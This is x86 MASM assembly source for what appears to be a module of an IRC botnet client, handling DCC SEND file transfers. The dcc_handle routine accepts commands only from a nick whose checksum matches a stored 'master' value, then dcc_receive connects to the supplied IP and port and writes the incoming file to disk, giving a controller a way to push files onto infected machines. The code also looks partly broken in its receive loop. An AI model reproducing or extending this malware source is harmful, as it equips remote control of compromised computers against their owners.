;-----------------------------------------------------------------------
.386
.model flat, stdcall
option casemap:none

;-----------------------------------------------------------------------
include     project.inc
includes    ..\..\common\misc.inc, ..\..\common\xcrcsz.inc

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
dcc_receive proc    lpparam
    local   dcc:DCC_RECEIVE, sockaddrin:sockaddr_in, dccbuf[64]:byte, dcc_buffer[8192]:byte
    local   dwtries, dwbytes, dwbyteswritten, dwtotalbytes, dwbytesreceived, dwsocket, dwmode, hfile

    ;int     3
    invoke  xcopy, addr dcc, lpparam, sizeof dcc
    
    invoke  socket, PF_INET, SOCK_STREAM, 0
    mov     dwsocket, eax

    mov     sockaddrin.sin_family, AF_INET
    
    invoke  atodw, addr dcc.szport
    invoke  htons, eax
    mov     sockaddrin.sin_port, ax
    
    invoke  atodw, addr dcc.szip
    invoke  htonl, eax
    mov     sockaddrin.sin_addr, eax
    
    m2m     dwtries, 3
    .while  (1)
        
        invoke  connect, dwsocket, addr sockaddrin, sizeof sockaddrin
        .break  .if     eax != -1
        
        dec     dwtries
        .break  .if     ZERO?

        invoke  printf, SADD("%s"), SADD("Could't stablish connection.", CR, LF, 0)
        invoke  Sleep, 100
    
    .endw

    .if     eax != -1
        mov     dwmode, 1
        invoke  ioctlsocket, dwsocket, FIONBIO, addr dwmode
        
        invoke  CreateFile, addr dcc.szfile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
        mov     hfile, eax

        invoke  atodw, addr dcc.szsize
        invoke  htonl, eax
        mov     dwtotalbytes, eax
        
        mov     dwbytesreceived, 0

        .while  (1)

            invoke  recv, dwsocket, addr dcc_buffer, sizeof dcc_buffer, 0
            mov     dwbytes, eax

            .if     eax == SOCKET_ERROR || !eax
              invoke    WSAGetLastError
              .break    .if !eax == WSAEWOULDBLOCK
            
            .endif
        .endw

        .if     eax
            mov     eax, dwbytesreceived
            add     eax, dwbytes
            mov     dwbytesreceived, eax
            invoke  WriteFile, hfile, addr dcc_buffer, dwbytes, addr dwbyteswritten, 0

            invoke  ntohl, dwbytesreceived
            mov     dwbytes, eax
            .while  (1)
                invoke  Sleep, 1
                invoke  send, dwsocket, addr dwbytes, 4, 0
                .if     eax == SOCKET_ERROR
                    invoke  WSAGetLastError
                    .break  .if !eax == WSAEWOULDBLOCK
                .endif
            .endw

        .endif
    
        invoke  CloseHandle, hfile
    
    .endif
    invoke  closesocket, dwsocket

    ret
dcc_receive endp

;-----------------------------------------------------------------------
dcc_handle  proc    lpszline
    local   dcc:DCC_RECEIVE, dwthreadid, sznick[MAX_NAME_LENGTH]:byte
    ; :Asphyxia^ZOMG!qwerty@DIxeS7.CpwqC7.virtual PRIVMSG Administrator1497467075 :?DCC SEND control.ini 3358705946 1024 11329?
    invoke  get_token, addr sznick, lpszline, ':', 1, TRUE
    invoke  get_token, addr sznick, addr sznick, '!', 0, FALSE
    
    mov     ebx, lpbot_info
    invoke  xcrcsz, addr sznick
    .if     eax == dword ptr (sbot_data ptr [ebx]).dwmaster

        invoke  get_token, addr dcc.szfile, lpszline, ' ', 5, FALSE
        invoke  get_token, addr dcc.szip, lpszline, ' ', 6, FALSE
        invoke  get_token, addr dcc.szport, lpszline, ' ', 7, FALSE

        invoke  get_token, addr dcc.szsize, lpszline, ' ', 8, FALSE
        invoke  get_token, addr dcc.szsize, addr dcc.szsize, 1, 0, FALSE
        
        invoke  printf, SADD("%s"), SADD("Starting DCC recieve thread")
        invoke  CreateThread, 0, 16384, addr dcc_receive, addr dcc, 0, addr dwthreadid
        invoke  WaitForSingleObject, eax, -1
        invoke  CloseHandle, dwthreadid
    
    ;.else

    .endif
    ret
dcc_handle  endp

;-----------------------------------------------------------------------
ibm_init    proc    lpsbot_data
    
    m2m     lpbot_info, lpsbot_data
    mov     eax, offset mdt
    
    ret
ibm_init    endp

end
;-----------------------------------------------------------------------
